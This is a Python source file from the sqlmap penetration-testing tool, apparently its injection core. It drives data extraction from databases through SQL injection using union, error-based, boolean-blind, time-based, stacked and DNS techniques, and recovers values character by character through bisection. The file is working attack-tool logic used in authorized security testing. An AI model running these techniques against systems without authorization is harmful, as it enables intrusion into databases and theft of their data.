#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import cleanQuery
from lib.core.common import expandAsteriskForColumns
from lib.core.common import extractExpectedValue
from lib.core.common import getPublicTypeMembers
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import initTechnique
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import parseUnionPage
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import readInput
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.exception import SqlmapUserQuitException
from lib.core.settings import MAX_TECHNIQUES_PER_VALUE
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.threads import getCurrentThreadData
from lib.request.connect import Connect as Request
from lib.request.direct import direct
from lib.techniques.blind.inference import bisection
from lib.techniques.blind.inference import queryOutputLength
from lib.techniques.dns.test import dnsTest
from lib.techniques.dns.use import dnsUse
from lib.techniques.error.use import errorUse
from lib.techniques.union.use import unionUse

def _goDns(payload, expression):
    value = None

    if conf.dnsName and kb.dnsTest is not False:
        if kb.dnsTest is None:
            dnsTest(payload)

        if kb.dnsTest:
            value = dnsUse(payload, expression)

    return value

def _goInference(payload, expression, charsetType=None, firstChar=None, lastChar=None, dump=False, field=None):
    start = time.time()
    value = None
    count = 0

    value = _goDns(payload, expression)

    if value:
        return value

    timeBasedCompare = (kb.technique in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))

    if not (timeBasedCompare and kb.dnsTest):
        if (conf.eta or conf.threads > 1) and Backend.getIdentifiedDbms() and not timeBasedCompare:
            if field:
                nulledCastedField = agent.nullAndCastField(field)
                injExpression = expression.replace(field, nulledCastedField, 1)
            else:
                injExpression = expression
            length = queryOutputLength(injExpression, payload)
        else:
            length = None

        kb.inferenceMode = True
        count, value = bisection(payload, expression, length, charsetType, firstChar, lastChar, dump)
        kb.inferenceMode = False

        if not kb.bruteMode:
            debugMsg = "performed %d queries in %d seconds" % (count, calculateDeltaSeconds(start))
            logger.debug(debugMsg)

    return value

def _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
    outputs = []
    origExpr = None

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field)

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        output = _goInference(payload, expressionReplaced, charsetType, firstChar, lastChar, dump, field)

        if isinstance(num, int):
            expression = origExpr

        outputs.append(output)

    return outputs

def _goInferenceProxy(expression, fromUser=False, batch=False, unpack=True, charsetType=None, firstChar=None, lastChar=None, dump=False):
    """
    Retrieve the output of a SQL query characted by character taking
    advantage of an blind SQL injection vulnerability on the affected
    parameter through a bisection algorithm.
    """

    initTechnique(kb.technique)

    query = agent.prefixQuery(kb.injection.data[kb.technique].vector)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)
    count = None
    startLimit = 0
    stopLimit = None
    outputs = BigArray()
    untilLimitChar = None
    untilOrderChar = None

    if not unpack:
        return _goInference(payload, expression, charsetType, firstChar, lastChar, dump)

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    rdbRegExp = re.search("RDB\$GET_CONTEXT\([^)]+\)", expression, re.I)
    if rdbRegExp and Backend.isDbms(DBMS.FIREBIRD):
        expressionFieldsList = [expressionFields]

    if len(expressionFieldsList) > 1:
        infoMsg = "the SQL query provided has more than one field. "
        infoMsg += "sqlmap will now unpack it into distinct queries "
        infoMsg += "to be able to retrieve the output even if we "
        infoMsg += "are going blind"
        logger.info(infoMsg)

    # If we have been here from SQL query/shell we have to check if
    # the SQL query might return multiple entries and in such case
    # forge the SQL limiting the query output one entry per time
    # NOTE: I assume that only queries that get data from a table
    # can return multiple entries
    if fromUser and " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() \
      not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not \
      expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) \
      and not re.search(SQL_SCALAR_REGEX, expression, re.I):

        limitCond = True
        limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)
        topLimit = re.search("TOP\s+([\d]+)\s+", expression, re.I)

        if limitRegExp or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.SQLITE):
                limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                if limitGroupStart.isdigit():
                    startLimit = int(limitRegExp.group(int(limitGroupStart)))

                stopLimit = limitRegExp.group(int(limitGroupStop))
                limitCond = int(stopLimit) > 1

            elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                if limitRegExp:
                    limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                    limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1
                elif topLimit:
                    startLimit = 0
                    stopLimit = int(topLimit.group(1))
                    limitCond = int(stopLimit) > 1

            elif Backend.isDbms(DBMS.ORACLE):
                limitCond = False

        # We assume that only queries NOT containing a "LIMIT #, 1"
        # (or similar depending on the back-end DBMS) can return
        # multiple entries
        if limitCond:
            if limitRegExp and stopLimit is not None:
                stopLimit = int(stopLimit)

                # From now on we need only the expression until the " LIMIT "
                # (or similar, depending on the back-end DBMS) word
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.SQLITE):
                    stopLimit += startLimit
                    untilLimitChar = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)
                    expression = expression[:untilLimitChar]

                elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                    stopLimit += startLimit

            test = True
            if not stopLimit or stopLimit <= 1:
                if Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]):
                    test = False

            if test:
                # Count the number of SQL query entries output
                countFirstField = queries[Backend.getIdentifiedDbms()].count.query % expressionFieldsList[0]
                countedExpression = expression.replace(expressionFields, countFirstField, 1)

                if re.search(" ORDER BY ", expression, re.I):
                    untilOrderChar = countedExpression.index(" ORDER BY ")
                    countedExpression = countedExpression[:untilOrderChar]

                if not stopLimit:
                    count = _goInference(payload, countedExpression, charsetType=CHARSET_TYPE.DIGITS, firstChar=firstChar, lastChar=lastChar)

                    if isNumPosStrValue(count):
                        count = int(count)

                        if batch:
                            stopLimit = count
                        else:
                            message = "the SQL query provided can return "
                            message += "%d entries. How many " % count
                            message += "entries do you want to retrieve?\n"
                            message += "[a] All (default)\n[#] Specific number\n"
                            message += "[q] Quit"
                            test = readInput(message, default="a")

                            if not test or test[0] in ("a", "A"):
                                stopLimit = count

                            elif test[0] in ("q", "Q"):
                                raise SqlmapUserQuitException

                            elif test.isdigit() and int(test) > 0 and int(test) <= count:
                                stopLimit = int(test)

                                infoMsg = "sqlmap is now going to retrieve the "
                                infoMsg += "first %d query output entries" % stopLimit
                                logger.info(infoMsg)

                            elif test[0] in ("#", "s", "S"):
                                message = "how many? "
                                stopLimit = readInput(message, default="10")

                                if not stopLimit.isdigit():
                                    errMsg = "invalid choice"
                                    logger.error(errMsg)

                                    return None

                                else:
                                    stopLimit = int(stopLimit)

                            else:
                                errMsg = "invalid choice"
                                logger.error(errMsg)

                                return None

                    elif count and not count.isdigit():
                        warnMsg = "it was not possible to count the number "
                        warnMsg += "of entries for the SQL query provided. "
                        warnMsg += "sqlmap will assume that it returns only "
                        warnMsg += "one entry"
                        logger.warn(warnMsg)

                        stopLimit = 1

                    elif (not count or int(count) == 0):
                        if not count:
                            warnMsg = "the SQL query provided does not "
                            warnMsg += "return any output"
                            logger.warn(warnMsg)

                        return None

                elif (not stopLimit or stopLimit == 0):
                    return None

                try:
                    for num in xrange(startLimit, stopLimit):
                        output = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=num, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)
                        outputs.append(output)

                except KeyboardInterrupt:
                    print
                    warnMsg = "user aborted during dumping phase"
                    logger.warn(warnMsg)

                return outputs

    elif Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().startswith("SELECT ") and " FROM " not in expression.upper():
        expression += FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]

    outputs = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)

    return ", ".join(output for output in outputs) if not isNoneValue(outputs) else None

def _goBooleanProxy(expression):
    """
    Retrieve the output of a boolean based SQL query
    """

    initTechnique(kb.technique)

    vector = kb.injection.data[kb.technique].vector
    vector = vector.replace("[INFERENCE]", expression)
    query = agent.prefixQuery(vector)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)
    timeBasedCompare = kb.technique in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)

    output = hashDBRetrieve(expression, checkConf=True)

    if output is None:
        output = Request.queryPage(payload, timeBasedCompare=timeBasedCompare, raise404=False)

        if output is not None:
            hashDBWrite(expression, output)

    return output

def _goUnion(expression, unpack=True, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of an union SQL
    injection vulnerability on the affected parameter.
    """

    output = unionUse(expression, unpack=unpack, dump=dump)

    if isinstance(output, basestring):
        output = parseUnionPage(output)

    return output

def getValue(expression, blind=True, union=True, error=True, time=True, fromUser=False, expected=None, batch=False, unpack=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=None, expectingNone=False, safeCharEncode=True):
    """
    Called each time sqlmap inject a SQL query on the SQL injection
    affected parameter.
    """

    if conf.hexConvert:
        charsetType = CHARSET_TYPE.HEXADECIMAL

    kb.safeCharEncode = safeCharEncode
    kb.resumeValues = resumeValue

    if suppressOutput is not None:
        pushValue(getCurrentThreadData().disableStdOut)
        getCurrentThreadData().disableStdOut = suppressOutput

    try:
        if expected == EXPECTED.BOOL:
            forgeCaseExpression = booleanExpression = expression

            if expression.upper().startswith("SELECT "):
                booleanExpression = expression[len("SELECT "):]
                if re.search(r"(?i)\(.+\)\Z", booleanExpression):
                    booleanExpression = "%s=%s" % (booleanExpression, "'1'" if "'1'" in booleanExpression else '1')
            else:
                forgeCaseExpression = agent.forgeCaseStatement(expression)

        if conf.direct:
            value = direct(forgeCaseExpression if expected == EXPECTED.BOOL else expression)

        elif any(map(isTechniqueAvailable, getPublicTypeMembers(PAYLOAD.TECHNIQUE, onlyValues=True))):
            query = cleanQuery(expression)
            query = expandAsteriskForColumns(query)
            value = None
            found = False
            count = 0

            if query and not re.search(r"COUNT.*FROM.*\(.*DISTINCT", query, re.I):
                query = query.replace("DISTINCT ", "")

            if not conf.forceDns:
                if union and isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                    kb.technique = PAYLOAD.TECHNIQUE.UNION
                    value = _goUnion(forgeCaseExpression if expected == EXPECTED.BOOL else query, unpack, dump)
                    count += 1
                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

                if error and any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) and not found:
                    kb.technique = PAYLOAD.TECHNIQUE.ERROR if isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR) else PAYLOAD.TECHNIQUE.QUERY
                    value = errorUse(forgeCaseExpression if expected == EXPECTED.BOOL else query, dump)
                    count += 1
                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

                if found and conf.dnsName:
                    _ = "".join(filter(None, (key if isTechniqueAvailable(value) else None for key, value in {"E":PAYLOAD.TECHNIQUE.ERROR, "Q":PAYLOAD.TECHNIQUE.QUERY, "U":PAYLOAD.TECHNIQUE.UNION}.items())))
                    warnMsg = "option '--dns-domain' will be ignored "
                    warnMsg += "as faster techniques are usable "
                    warnMsg += "(%s) " % _
                    singleTimeWarnMessage(warnMsg)

            if blind and isTechniqueAvailable(PAYLOAD.TECHNIQUE.BOOLEAN) and not found:
                kb.technique = PAYLOAD.TECHNIQUE.BOOLEAN

                if expected == EXPECTED.BOOL:
                    value = _goBooleanProxy(booleanExpression)
                else:
                    value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)

                count += 1
                found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

            if time and (isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME) or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED)) and not found:
                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME):
                    kb.technique = PAYLOAD.TECHNIQUE.TIME
                else:
                    kb.technique = PAYLOAD.TECHNIQUE.STACKED

                if expected == EXPECTED.BOOL:
                    value = _goBooleanProxy(booleanExpression)
                else:
                    value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)

            if value and isinstance(value, basestring):
                value = value.strip() if value.strip() else value[:1]
        else:
            errMsg = "none of the injection types identified can be "
            errMsg += "leveraged to retrieve queries output"
            raise SqlmapNotVulnerableException, errMsg

    finally:
        kb.resumeValues = True

        if suppressOutput is not None:
            getCurrentThreadData().disableStdOut = popValue()

    kb.safeCharEncode = False

    if not kb.testMode and value is None and Backend.getDbms() and conf.dbmsHandler:
        warnMsg = "in case of continuous data retrieval problems you are advised to try "
        warnMsg += "a switch '--no-cast' and/or switch '--hex'"
        singleTimeWarnMessage(warnMsg)

    return extractExpectedValue(value, expected)

def goStacked(expression, silent=False):
    kb.technique = PAYLOAD.TECHNIQUE.STACKED
    expression = cleanQuery(expression)

    if conf.direct:
        return direct(expression)

    query = agent.prefixQuery(";%s" % expression)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)
    Request.queryPage(payload, content=False, silent=silent, noteResponseTime=False, timeBasedCompare=True)

def checkBooleanExpression(expression, expectingNone=True):
    return getValue(expression, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY, suppressOutput=True, expectingNone=expectingNone)
